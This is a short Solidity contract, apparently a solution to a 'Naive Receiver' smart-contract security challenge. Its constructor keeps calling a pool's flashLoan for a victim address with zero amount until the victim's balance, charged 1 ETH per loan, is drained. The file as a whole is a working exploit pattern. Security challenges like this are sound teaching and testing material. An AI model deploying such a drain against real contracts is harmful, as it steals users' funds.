// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    constructor (IPool pool, address victim) {
        while (victim.balance > 0) {
            pool.flashLoan(victim, 0); // each loan get fixed 1 ETH fee
        }
    }
}